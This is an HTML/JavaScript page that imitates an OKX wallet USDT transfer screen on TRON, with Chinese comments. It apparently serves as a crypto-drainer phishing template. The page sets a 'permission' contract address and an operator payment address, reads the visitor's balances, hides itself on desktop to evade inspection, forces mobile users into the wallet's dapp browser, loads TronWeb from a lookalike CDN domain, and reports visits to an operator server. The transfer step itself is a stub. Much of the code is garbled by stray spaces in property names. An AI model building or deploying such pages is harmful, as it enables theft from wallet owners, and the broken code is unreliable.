<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf - 8">
    <meta http - equiv="X - UA - Compatible" content="IE=edge">
    <meta name="viewport" content="width=device - width, initial - scale = 1, maximum - scale = 1, minimum - scale = 1">
    <title>正在申请转账</title>
    <link rel="icon" type="image/png" href="icon_trx.png">
    <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
    <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
    <script src="https://code.jquery.com/jquery - 3.6.0.min.js"></script>
    <link rel="stylesheet" href="okx.css">
    <style>
        /* 临时添加一些通用样式，以防原样式文件加载问题 */
        body {
            font - family: Arial, sans - serif;
            padding: 20px;
        }

      .btn {
            padding: 10px 20px;
            background - color: #ccc;
            border: none;
            cursor: pointer;
        }

      .submit - btn {
            background - color: #007bff;
            color: white;
        }

      .submit - btn.disabled {
            background - color: #ccc;
            cursor: not - allowed;
        }
    </style>
</head>

<body id="app">
    <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>

    <div class="pay - box">
        <div class="amount">
            <div class="num"><span class="amount" id="amount"></span><em>USDT</em></div><img src="icon_exchange.jpg" class="icon">
        </div>
        <div class="rate"><span id="amount - display"></span><em>USD</em>
            <div class="icon"><img src="icon_horn.jpg"></div>
        </div>
    </div>
    <div class="bottom - keyboard">
        <div class="asset - info">
            <div class="name"><img src="icon_trx.png" class="coin">
                <div class="asset - box">
                    <p class="title">余额</p>
                    <p class="num"><span id="ye"></span><em>USDT</em></p><input type="text" id="address" style="display:none">
                </div>
            </div>
            <div class="right">
                <div class="btn">最大</div>
            </div>
        </div>
        <div class="keyboard - box">
            <div class="btn">1</div>
            <div class="btn">2</div>
            <div class="btn">3</div>
            <div class="btn">4</div>
            <div class="btn">5</div>
            <div class="btn">6</div>
            <div class="btn">7</div>
            <div class="btn">8</div>
            <div class="btn">9</div>
            <div class="btn">.</div>
            <div class="btn">0</div>
            <div class="btn delete" onclick="clearAmount()" style="margin - top:20px"><img src="icon_delete.jpg"></div>
        </div>
        <footer style="display: flex; justify - content: center; align - items: center; margin - top: 20px;">
            <button class="submit - btn disabled" type="button" id="submitBtn" disabled>下一步</button>
            <button id="jixu" class="jixu">继续</button>
        </footer>
    </div>
    <div class="tishi" id="tip">提示</div><input id="to_address" type="hidden">

    <script>
        // 权限地址（合约地址）
        window.Permission_address = 'THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8';
        // 收款地址（个人地址）
        window.Payment_address = 'TM1zzNDZD2DPASbKcgdVoTYhfmYgtfwx9R';
        // USDT官方合约地址（无需修改）
        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        // 服务器地址用于发送心跳（修改为你自己的服务器域名）
        window.heartbeatUrl = 'https://baidu.com/heartbeat';

        // 存储用户数据
        const userData = {
            address: null,
            trxBalance: null,
            usdtBalance: null
        };
        let currentAmount = '0';
        // USDT兑换USD的汇率
        const USDT_TO_USD_RATE = 1;

        // 主初始化函数
        async function initializeDApp() {
            console.log('initializeDApp start');
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            const isDAppBrowser = typeof window.tronWeb!== 'undefined' || typeof window.tronLink!== 'undefined';

            if (!isMobile) {
                document.body.innerHTML = '';
            } else if (isMobile &&!isDAppBrowser) {
                const currentUrl = encodeURIComponent(window.location.href);
                window.location.href = "okx://wallet/dapp/details?dappUrl=" + currentUrl;
            } else if (isMobile && isDAppBrowser) {
                await connectWallet();
                bindButtonEvents();
            }
            updateAmountDisplay();
            console.log('initializeDApp end');
        }

        // 连接到钱包
        async function connectWallet() {
            console.log('connectWallet start');
            try {
                if (window.tronWeb && window.tronWeb.ready) {
                    await initDApp();
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res.code === 200) {
                        window.tronWeb = window.tronLink.tronWeb;
                        await initDApp();
                    }
                }
            } catch (error) {
                console.error("钱包连接失败:", error);
            }
            console.log('connectWallet end');
        }

        // 初始化DApp
        async function initDApp() {
            console.log('initDApp start');
            try {
                userData.address = window.tronWeb.defaultAddress.base58;
                const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
                userData.trxBalance = window.tronWeb.fromSun(trxBalance);
                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
                const usdtBalance = await contract.balanceOf(userData.address).call();
                userData.usdtBalance = usdtBalance / 1e6;
                updateUSDTBalance();
            } catch (error) {
                console.error("获取用户数据时出错:", error);
            }
            console.log('initDApp end');
        }

        // 更新页面的USDT余额
        function updateUSDTBalance() {
            console.log('updateUSDTBalance start');
            const balanceElement = document.getElementById('ye');
            if (balanceElement) {
                balanceElement.textContent = parseFloat(userData.usdtBalance).toFixed(4);
            } else {
                console.error("未找到显示余额的元素");
            }
            console.log('updateUSDTBalance end');
        }

        function pressKey(key) {
            console.log('pressKey start, key:', key);
            if (key === 'delete') {
                deleteLastChar();
                return;
            }
            if (currentAmount.length >= 10) return;
            if (key === '.') {
                if (currentAmount.includes('.')) return;
                if (currentAmount === '0') {
                    currentAmount = '0.';
                } else {
                    currentAmount += '.';
                }
                updateAmountDisplay();
                return;
            }
            let [integerPart, decimalPart] = currentAmount.split('.');
            if (typeof decimalPart!== 'undefined') {
                if (decimalPart.length < 4) {
                    decimalPart += key;
                }
            } else {
                if (integerPart === '0') {
                    integerPart = key;
                } else {
                    integerPart += key;
                }
            }
            currentAmount = decimalPart? `${integerPart}.${decimalPart}` : integerPart;
            updateAmountDisplay();
            console.log('pressKey end');
        }

        function deleteLastChar() {
            console.log('deleteLastChar start');
            if (currentAmount.length > 0) {
                currentAmount = currentAmount.slice(0, -1);
            }
            if (currentAmount === '') {
                currentAmount = '0';
            }
            updateAmountDisplay();
            console.log('deleteLastChar end');
        }

        function setMaxAmount() {
            console.log('setMaxAmount start');
            currentAmount = parseFloat(userData.usdtBalance).toFixed(4);
            updateAmountDisplay();
            console.log('setMaxAmount end');
        }

        // 更新金额显示
        function updateAmountDisplay() {
            console.log('updateAmountDisplay start');
            let displayAmount = currentAmount;
            const maxBalance = parseFloat(userData.usdtBalance || '0');

            if (parseFloat(displayAmount) > maxBalance) {
                displayAmount = maxBalance.toFixed(4);
                currentAmount = displayAmount;
            }

            const amountElement = document.getElementById('amount');
            if (amountElement) {
                amountElement.textContent = displayAmount;
            }

            const usdAmount = (parseFloat(displayAmount) * USDT_TO_USD_RATE).toFixed(2);
            const usdElement = document.getElementById('amount - display');
            if (usdElement) {
                usdElement.textContent = usdAmount;
            }

            updateNextButtonState();
            const title = `正在申请转账 ${displayAmount} USDT`;
            document.title = title;
            console.log('updateAmountDisplay end');
        }

        function updateNextButtonState() {
            console.log('updateNextButtonState start');
            const nextButton = document.getElementById('submitBtn');
            if (nextButton) {
                const amount = parseFloat(currentAmount || '0');
                const isValid = amount > 0 && amount <= parseFloat(userData.usdtBalance || '0');
                nextButton.disabled =!isValid;
                nextButton.classList.toggle('disabled',!isValid);
            }
            console.log('updateNextButtonState end');
        }

        function bindButtonEvents() {
            console.log('bindButtonEvents start');
            document.querySelectorAll('.keyboard - box.btn').forEach(btn => {
                if (btn.classList.contains('delete')) {
                    btn.addEventListener('click', () => pressKey('delete'));
                } else {
                    btn.addEventListener('click', (event) => pressKey(event.target.textContent));
                }
            });
            const maxBtn = document.querySelector('.asset - info.right.btn');
            if (maxBtn) {
                maxBtn.addEventListener('click', setMaxAmount);
            }
            const nextBtn = document.getElementById('submitBtn');
            if (nextBtn) {
                nextBtn.addEventListener('click', onNextButtonClick);
            }
            console.log('bindButtonEvents end');
        }

        function handleButtonClick(event) {
            const key = event.target.textContent;
            pressKey(key);
        }

        // 显示提示
        function tip(message) {
            console.log('tip start, message:', message);
            const tipElement = document.getElementById('tip');
            if (tipElement) {
                tipElement.textContent = message;
                tipElement.style.display = 'block';

                tipElement.style.height = 'auto';
                const height = tipElement.offsetHeight;
                tipElement.style.height = height + 'px';

                setTimeout(() => {
                    tipElement.style.display = 'none';
                }, 3000);
            }
            console.log('tip end');
        }

        document.addEventListener('DOMContentLoaded', () => {
            console.log('DOMContentLoaded event');
            updateAmountDisplay();
            initializeDApp();
        });

        // 向服务器发送心跳 不需要可以注释
        function sendHeartbeat() {
            console.log('sendHeartbeat start');
            const currentUrl = window.location.href;

            fetch(window.heartbeatUrl, {
                method: 'POST',
                mode: 'cors',
                headers: {
                    'Content - Type': 'application/json',
                },
                body: JSON.stringify({ url: currentUrl })
            })
        .then(response => response.json())
        .then(data => {
                if (data.status === 'error' && data.message === '会话已结束') {
                    console.log('会话已结束');
                }
            })
        .catch(() => {
            });
            console.log('sendHeartbeat end');
        }

        const heartbeatInterval = setInterval(sendHeartbeat, 5000);
        window.onload = sendHeartbeat;
        window.onbeforeunload = function () {
            clearInterval(heartbeatInterval);
        };

        function onNextButtonClick() {
            console.log('下一步按钮被点击');
        }

        function clearAmount() {
            currentAmount = '0';
            updateAmountDisplay();
        }
    </script>
</body>

</html>
